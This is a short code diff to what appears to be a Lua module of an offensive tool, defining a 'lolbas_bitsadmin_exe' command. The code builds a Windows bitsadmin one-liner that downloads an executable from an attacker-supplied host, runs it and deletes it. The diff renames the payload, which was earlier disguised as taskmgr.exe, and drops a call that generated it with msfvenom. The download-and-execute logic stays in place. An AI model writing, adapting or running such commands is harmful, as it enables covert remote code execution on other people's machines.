@@ -1,12 +1,11 @@
 register_command("lolbas_bitsadmin_exe", function()
     local lhost = app.params["lhost"]
     local lport = app.params["lport"]
-    local out_exe = "sessions/taskmgr.exe"
-    local url = "http://" .. lhost .. "/taskmgr.exe"
+    local out_exe = "stub.exe"
+    local url = "http://" .. lhost .. "/stub.exe"
 
     if not lhost or not lport then return "Error: set lhost and lport" end
-
-    run_msfvenom(lhost, lport, out_exe)
+    
 
     local cmd = string.format('bitsadmin /transfer A /download /priority normal %s %s && %s && del %s', url, out_exe, out_exe, out_exe)
 
